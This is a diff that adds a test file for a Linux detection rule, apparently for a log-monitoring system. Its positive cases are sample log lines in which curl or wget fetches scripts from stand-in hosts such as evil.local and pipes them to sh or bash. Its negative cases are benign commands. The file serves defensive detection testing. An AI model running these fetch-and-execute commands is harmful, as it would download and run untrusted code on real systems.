@@ -1,0 +1,22 @@
+rule: lnx-exec-001
+
+# Needs curl/wget AND a pipe-to-shell pattern.
+
+positive:
+  - description: curl piped to sh
+    event:
+      full_log: 'user ran: curl http://evil.local/installer.sh | sh'
+  - description: wget piped to bash
+    event:
+      full_log: 'wget -qO- http://evil.local/init.sh | bash'
+  - description: wget -O- piped via /bin/sh
+    event:
+      full_log: 'wget -O- http://x/y | /bin/sh'
+
+negative:
+  - description: curl saved to disk only
+    event:
+      full_log: 'curl -o /tmp/installer.sh http://example.local/x.sh'
+  - description: Plain bash command
+    event:
+      full_log: 'user ran: bash /usr/local/bin/legit.sh'
